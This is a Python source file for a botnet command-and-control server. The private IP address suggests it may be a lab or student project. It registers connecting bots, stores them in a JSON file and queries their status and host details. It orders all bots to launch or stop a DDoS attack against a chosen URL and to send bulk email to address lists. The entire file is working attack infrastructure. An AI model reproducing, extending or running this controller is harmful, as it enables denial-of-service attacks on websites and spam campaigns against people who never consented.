import http.client
import requests
import socket
import json
import threading


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host: str, port: int):
        self.__address = (host, port)  # IP address and port of the CnC
        self.__bots = {}  # connected bots
        self.__load_bots()

        # available commands of the CnC
        self.__cmds = {
            'commands': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
            'help': {'fun': self.__help, 'desc': self.__help.__doc__, 'args': 1},
            'bots': {'fun': self.__list_bots, 'desc': self.__list_bots.__doc__, 'args': 0},
            'info': {'fun': self.__info, 'desc': self.__info.__doc__, 'args': 1},
            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': 1},
            'attack': {'fun': self.__attack, 'desc': self.__attack.__doc__, 'args': 1},
            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
            'email': {'fun': self.__email, 'desc': self.__email.__doc__, 'args': 2},
            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
        }
        self.__lock = threading.Lock()  # lock for thread-safe access to attributes

        # socket that listen for connect/disconnect bots
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.bind(self.__address)
        self.__socket.listen(10)
        self.__socket.settimeout(3)

    def __load_bots(self):
        """
        Add bots whose IP addresses are stored in the bots json file. It checks if the bots are still online first.
        """
        with open("bots.json", "r") as f:
            bots = json.load(f)

        for addr, port in bots.items():
            try:
                requests.get(f"http://{addr}:{port}/status")
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
                continue
            self.__bots[addr] = port

    def __send_gets(self, path, addresses=None):
        """
        Send get requests for the specified path to the given addresses or to all the bots connected if none is given.
        """
        with self.__lock:
            if not self.__bots:
                return None

            if not addresses:
                addresses = self.__bots.keys()

            responses = {}

            for addr in addresses:
                if addr not in self.__bots.keys():
                    responses[addr] = None
                    continue

                try:
                    responses[addr] = requests.get(f"http://{addr}:{self.__bots[addr]}{path}")
                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
                    responses[addr] = None
                    self.__bots.pop(addr)
        return responses

    def __bot_connection(self, stop: threading.Event):
        """
        Thread that listen on the CnC socket bots connection. If a bot connects for the first time it saves the address
        and the port in which it is listening to the connected bots. If a bots connect for the second time the function
        removes it from the connected bots.

        :param stop: threading event to stop listening on the socket
        """
        while not stop.is_set():
            try:
                client, address = self.__socket.accept()
            except socket.timeout:
                continue

            address = address[0]

            with self.__lock:
                if address in self.__bots.keys():
                    self.__bots.pop(address)
                else:
                    self.__bots[address] = int(client.recv(1024).decode("utf-8"))
            client.close()
        self.__socket.close()

    def __commands(self) -> str:
        """
        Lists all the commands available.
        """
        return "\n- " + "\n- ".join(
            f"{cmd}:\n\t" + self.__cmds[cmd]['desc'].strip().split("\n")[0]
            for cmd in self.__cmds.keys()
        )

    def __help(self, args):
        """
        Prints the description of a specific command.

            > help cmd

        cmd: command name
        """
        cmd = args[0]
        if cmd not in self.__cmds.keys():
            return f"Command {cmd} does not exists."
        return f"{cmd}:\n\t" + self.__cmds[cmd]['desc'].strip()

    def __list_bots(self) -> str:
        """
        Lists all the bots that are online and connected to the botnet.
        """
        res = "Bots connected:\n"
        responses = self.__send_gets('/status')

        if responses is None:
            return "No bots connected."

        for addr, resp in responses.items():
            status = json.loads(resp.text)
            res += f"\t- IP:\t{addr}\n\t  Port:\t{self.__bots[addr]}\n\t  Action:\t{status['action']}\n" \
                   f"\t  Target:\t{status['target']}\n "
        return res

    def __get_something(self, address, path) -> str:
        """
        Gets info or status.
        """
        res = ""
        responses = self.__send_gets(path, addresses=[address])
        if responses is None:
            return "No bots connected."
        resp = responses[address]

        if resp is None or resp.status_code != 200:
            return "Bot is not connected.\n"
        res += f"\nBot {address}:\n"
        for k, v in json.loads(resp.text).items():
            res += f"\t- {k}: {v}\n"
        return res

    def __status(self, args):
        """
        Checks the status of a specific bot given his IP addresses.

            > status address

        address: IP addresses of the bot
        """
        return self.__get_something(args[0], "/status")

    def __info(self, args):
        """
        Gets information about the software and hardware configurations of a specific bot given his IP address.

            > info address

        address: IP address of the bot
        """
        return self.__get_something(args[0], "/info")

    def __attack(self, args):
        """
        Starts a DDoS attack to the given  url.

            > attack url

        urls: the url of the resource to attack
        """
        with self.__lock:
            if len(self.__bots) == 0:
                return "No bot connected."
            url = args[0]
            responses = {
                requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                for address, port in self.__bots.items()
            }
        if len(responses) == 1:
            code = responses.pop()
            if code == 403:
                return "An attack is already going on."
            if code == 400:
                return f"Attack did not start because the url '{url}' is not reachable."
            if code != 200:
                return "Attack did not start..."
        return "Attack started successfully!"

    def __stop(self):
        """
        Stops the running DDoS attacks.
        """
        responses = self.__send_gets('/stop')

        if responses is None:
            return "No bot connected."

        codes = {r.status_code for r in responses.values()}

        if len(codes) == 1 and codes.pop() == 406:
            return "There isn't any attack running."
        return "Attack stopped successfully!"

    def __email(self, files):
        """
        Makes all the bot connected email every address stored in the given file.

            > email addresses_path message_path

        addresses_path: path to a JSON file containing a list of addresses to mail.
        message_path: path to a text file containing the message to send.
        """
        addresses_path, message_path = files

        try:
            with open(addresses_path, 'r') as f:
                emails = json.load(f)
        except FileNotFoundError:
            return f"The file {addresses_path} does not exists."

        try:
            with open(message_path, 'r', encoding='utf-8') as f:
                subj, txt = f.read().split('\n\n', 1)
        except FileNotFoundError:
            return f"The file {message_path} does not exists"

        with self.__lock:
            if len(self.__bots) == 0:
                return "No bot connected."

            to_send = {'emails': emails, 'subj': subj, 'txt': txt}
            responses = {
                requests.post(f"http://{address}:{port}/email", json=to_send).status_code
                for address, port in self.__bots.items()
            }
        if len(responses) == 1 and responses.pop() != 200:
            return "Emails were not sent due to an smtp server error, try again later."
        return "Emails sent successfully!"

    def __exit(self) -> str:
        """
        Closes the Command & Control.
        """
        with self.__lock:
            bots = json.dumps(self.__bots, indent=4)
            with open("bots.json", "w") as f:
                f.write(bots)
        return "Closing program..."

    def cli(self):
        """
        Command line interface to interact with the Command and Control center of the botnet.
        """

        # start of the socket listening thread
        stop = threading.Event()
        bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
        bot_conn.start()
        print("Botnet started...")

        cmd = 0

        # command prompt
        while cmd != "exit":
            print("\n(type 'commands' to view the commands list).")
            cmd = str.lower(input("\n> "))
            result = self.__run_cmd(cmd)
            print(result)

        stop.set()  # stop the socket thread

    def __run_cmd(self, line):
        """
        Interpret a given command and run the corresponding function with the given parameter.
        :param line: command line
        """
        try:
            if ' ' in line:  # if cmd has args
                cmd, args = line.split(' ', 1)
                args = args.split(' ')
                if self.__cmds[cmd]['args'] < len(args):
                    return "Too many arguments."
                elif self.__cmds[cmd]['args'] > len(args):
                    return "Too few arguments"
                else:
                    return self.__cmds[cmd]['fun'](args)
            else:  # if cmd has not args
                cmd = line
                if self.__cmds[cmd]['args'] > 0:
                    return "Too few arguments."
                else:
                    return self.__cmds[cmd]['fun']()
        except KeyError:
            return "Command not recognized."


HOST = '10.0.2.15'  # '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.cli()
